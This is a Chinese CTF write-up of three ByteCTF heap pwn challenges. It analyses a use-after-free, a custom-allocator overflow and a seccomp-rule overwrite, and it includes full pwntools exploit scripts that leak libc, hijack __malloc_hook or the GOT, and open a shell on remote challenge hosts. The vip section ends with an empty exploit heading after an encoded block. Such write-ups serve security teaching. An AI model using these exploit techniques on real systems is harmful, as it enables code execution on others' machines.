
# [原创] ByteCTF Pwn部分题解

## 0x01 mulnote

### 漏洞点分析
初看程序，是一个经`OLLVM`混淆过的`ELF`，不过对我们做`pwn`没有太多的影响。用`ida`直接分析其主要函数，也是一个经典的堆菜单题目。含有增删改查四个功能。 ![图片描述](upload/attach/202002/771450_R8KWNYB6YGAKRG6.png) 其中这个`free`函数`free`过后有10秒钟的延迟，这个导致了`UAF`。那么有`UAF`这道题就迎刃而解了。

### 利用
1. `Create`一个大于`0x80`的`chunk`
2. `free`掉就可以`show` `leak` `libc`
3. `fastbin` `attack`修改`__malloc_hook`为`one_gadget`

### exp
```
#coding:utf-8
from pwn import *
import argparse
# env = os.environ
# env['LD_PRELOAD'] = './libc64.so'
IP = '112.126.101.96'
PORT = '9999'
binary = './mulnote'
io = None
parser = argparse.ArgumentParser()
parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()
sl = lambda x : io.sendline(x)
sd = lambda x : io.send(x)
sla = lambda x,y : io.sendlineafter(x,y)
rud = lambda x : io.recvuntil(x,drop=True)
ru = lambda x : io.recvuntil(x)
def lg(s, addr):
print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))
if args.remote:
io = remote(IP, PORT)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(binary)
elif args.local or args.debugger:
# env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
env = {}
io = process(binary, env=env)
elf = ELF(binary)
proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), binary))]
libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
parser.print_help()
exit()
def debug(msg=""):
msg = """
x/20xg 0x{:x}
""".format(proc_base + 0x202020)
pwnlib.gdb.attach(io,msg)
# raw_input()
def create(sz,con):
sla(">","C")
sla(">",str(sz))
sla(">",con)
def edit(idx,con):
sla(">","E")
sla(">",str(idx))
sla(">",con)
def remove(idx):
sla(">","R")
sla(">",str(idx))
def show():
sla(">","S")
def exploit():
create(0x90,'a')
remove(0)
show()
leak = u64(ru("\x7f")[-6:].ljust(8,'\x00'))
lg('leak',leak)
base = leak - 0x3c4b78
__malloc_hook = base + libc.symbols['__malloc_hook']
lg('base',base)
create(0x90,'a')
create(0x60,'a')
create(0x60,'b')
remove(2)
remove(3)
remove(2)
one_gg = base + 0x4526a
create(0x60,p64(__malloc_hook - 0x13))
create(0x60,'junk')
create(0x60,'junk')
create(0x60,'a'*3 + p64(one_gg))
# debug()
io.interactive()
if __name__ == "__main__":
exploit()
"""
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL
0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL
0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
"""
```

## 0x02 mheap

### 程序以及漏洞点分析
首先这个程序也是一个经典的堆题，分为增删改查4个功能。同其他堆题不一样的就是这个堆他不是真正意义上的堆，通过分析程序，它是通过`mmap`出一块内存出来之后，然后对这块内存进行管理，在`bss`有4个全局变量，分别是存放分配的`size`，`mmap`出来内存的地址，`free`掉堆块的链表的头部，正在使用中的堆块地址。`malloc`的时候首先会从`free_list`中查看是否存在一个堆块和我们想要申请的`size`一样的。如果一样就拿出来，不一样就遍历`free_list`，如果没有查找到，则从`mmap`内存切割，其实和`top_chunk`类似。然后`free`的话，直接将`chunk`放到`free_top`中去。`edit`，`show`函数没有什么好说的。其中堆块结构和`glibc`中的结构有点不一样的就是他的头部是存放的一个`size`和`fd`类似`fastbin`。那么其实分析到这里，按常规来说，没有发现什么漏洞，没有`UAF`。分配类似`0x(8)`这样块的大小，也不会占用下一块的头部。 ![图片描述](upload/attach/202002/771450_9CNZW9EJN7QT9HK.png)有个这样的操作。那么其实这个漏洞点，是存在在自定义的`read`的中的。`mmap`出来的内存最大可以提供`0x1000`大小。然而它没有将总分配的`size`做比较，导致了我们可以分配到`0x23330000 + 0x1000`后面的内存，那么这里的内存是无效的。在`read`的时候就会出错，返回`-1`。 ![图片描述](upload/attach/202002/771450_Q2A6GS7K84UTN44.png)然后数据还存放在缓冲区中，此时`v3`的值会减小，下一次循环的时候读入数据会将缓冲区中的数据给`read`处理，然而有部分字节被处理了`0x23330000`后面的数据不能被处理，继续返回`-1`，`v3`继续变小，这样`v3`不断往前移动，最后移动到刚好覆盖`chunk`头部，`fd`写入`bss`地址，`bss`地址构造一个`size`。然后就可以分配到`bss`段上了，直接修改`store_ptr`的地方，修改为`got`表，`leak` and `write`即可`Getshell`。

![图片描述](upload/attach/202002/771450_F6E23FZEEDQGZKK.png)。`exp`如下

### exp
```
#coding:utf-8
from pwn import *
import argparse
IP = '47.112.139.218'
PORT = '13132'
binary = './mheap'
io = None
parser = argparse.ArgumentParser()
parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()
sl = lambda x : io.sendline(x)
sd = lambda x : io.send(x)
ru = lambda x : io.recvuntil(x)
rud = lambda x : io.recvuntil(x,drop=True)
ruf = lambda x : io.recvuntil(x)
uu64 = lambda x : u64(x[-6:].ljust(8,'\x00'))
def lg(s, addr):
print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))
if args.remote:
io = remote(IP, PORT)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(binary)
elif args.local or args.debugger:
env = {}
io = process(binary, env=env)
elf = ELF(binary)
proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), binary))]
libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
parser.print_help()
exit()
def debug(msg=""):
msg = """
x/80xg 0x23330000
b *0x40121F
b *0x401568
"""
pwnlib.gdb.attach(io,msg)
def malloc(idx,sz,con):
ru("choice")
sl("1")
ru("Index")
sl(str(idx))
ru("size")
sl(str(sz))
ru("Content")
sd(con)
def show(idx):
ru("choice")
sl("2")
ru("Index")
sl(str(idx))
def free(idx):
ru("choice")
sl("3")
ru("Index")
sl(str(idx))
def edit(idx,con):
ru("choice")
sl("4")
ru("Index")
sl(str(idx))
sleep(0.3)
sd(con)
def exploit():
malloc(0, 0xfc0, '/bin/sh\n')
malloc(1, 0x10, '\0'*0x10)
free(1)
malloc(2, 0x28, p64(0x4040d0) + '\0'*0x1f + '\n')
malloc(3, 0x23330fd0 - 0x10, p64(elf.got['atoi']) + '\n')
show(0)
leak = u64(io.recvuntil('\n', drop=True)[-6:].ljust(8,'\x00'))
lg('leak',leak)
base = leak - libc.symbols['atoi']
lg("base",base)
edit(0, p64(base + libc.symbols['system']) + '\n')
io.sendline('/bin/sh\x00')
io.interactive()
if __name__ == "__main__":
exploit()
"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
rcx == NULL
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL
0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
"""
```

## 0x03 vip

### 程序及漏洞点分析
同样也是一道堆题，题目环境是`libc2.27`，带`tcache`环境。

![图片描述](upload/attach/202002/771450_X7QWSHVMZQ7U65T.png)题目有5个选单。`malloc`只能分配`0x50`个字节的大小。`free`直接`free`掉，然后置0，不存在`uaf`。`show`也是普通的打印，比较不一样的就是`edit`功能和`become vip`功能。 ![图片描述](upload/attach/202002/771450_KVHEQU5YKN42KG7.png)`edit`功能首先判断全局变量，如果不为0，就读取标准输入到`chunk`上，不然读随机数到`chunk`上，这就是本程序的一个很大的限制，不能读取我们的输入到堆块上，也就是堆块内容不可控，当然这边也存在一个未校验`size`的漏洞。可以无限读取，那么本题其实主要首先会想如何修改这个全局变量的值，当然首先考虑`unsorted bin attack`，但是这里堆块内容不可控，这个攻击也无法实现，再来看看`become vip`函数吧。这里是输入一个`name`到栈上，然后对程序使用`seccomp`保护。这里可以使用`seccomp-tools`对其进行分析。 ![图片描述](upload/attach/202002/771450_DHZJVP5MQBPYW3T.png)这里只允许四个系统调用，然而我们发现当我们`become vip`之后，也就是调用设置沙箱规则之后，`edit`的`open("/dev/random")`会返回`-1`，也就是打开失败，这里我们明明看到是`open`没有被限制，那么这里是什么原因造成的的呢? ![图片描述](upload/attach/201909/771450_753MR7VWGMUS8YJ.png)这里就可以看出来了，`openat`被限制了。![图片描述](upload/attach/202002/771450_PK8UB73ZRT56MQV.png) ![图片描述](upload/attach/202002/771450_4MK8MWKAZDRG6VR.png)那么这里输入的`buf`是存在溢出的，这里可以溢出30个字节，下面的其实就是沙箱的规则，这里的主要思路就是利用溢出修改啥箱规则，去让`openat`返回0。然后就可以正常读取输入了。<mark class="encrypted">433K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1j5i4k6A6k6o6V1@1x3X3A6Q4x3V1k6K6k6h3y4U0L8$3#2H3i4K6u0V1N6r3!0G2L8s2y4Q4c8e0S2Q4b7V1k6Q4z5e0W2Q4c8e0k6Q4z5e0S2Q4b7f1k6Q4c8e0k6Q4z5o6S2Q4z5e0q4Q4c8e0c8Q4b7V1c8Q4b7V1k6Q4c8e0N6Q4z5e0c8Q4b7e0S2Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0c8Q4b7U0S2Q4z5o6m8Q4c8e0c8Q4b7U0S2Q4b7f1q4Q4c8e0g2Q4b7U0N6Q4b7e0g2Q4c8e0g2Q4z5o6g2Q4b7U0N6Q4c8e0y4Q4z5o6m8Q4z5o6t1`.</mark>

### 主要利用流程
1.1 `malloc`的`size`不可控，但是程序中存在`scanf`。利用`scanf`导致`fastbin` `chunk`合并进入`small bin`, `leak` `libc` ![图片描述](upload/attach/202002/771450_63AUA84RMSGWRBU.png)

1.2 第二种`leak`的话其实和第一种不一样，第一种情况是对于不能控制输入到堆块的内容的`leak`，这一种是首先让堆块内容可控，然后`edit`修改下一块`size`即可。也是`leak` `main_arena`。

2. 由于关闭了`openat`，导致我们不能正常起`shell`，最后我们采用的方法是`ROP`读取`flag`。泄露栈地址，然后`alloc to stack`，然后`ret2syscall`。选用`sys_open`读取`flag`。

3. 其实还有一种方法，就是让我们能正常起`shell`。也就是修改过滤规律，过滤`openat` `syscall`。`rsi`参数也就是`/dev/urandom`。只要`rsi`等于`/dev/urandom`。那么就让`openat` `syscall`调用失败。其他的都`allow`，这样我们可以正常修改堆块，也可以起`shell`。

### exp
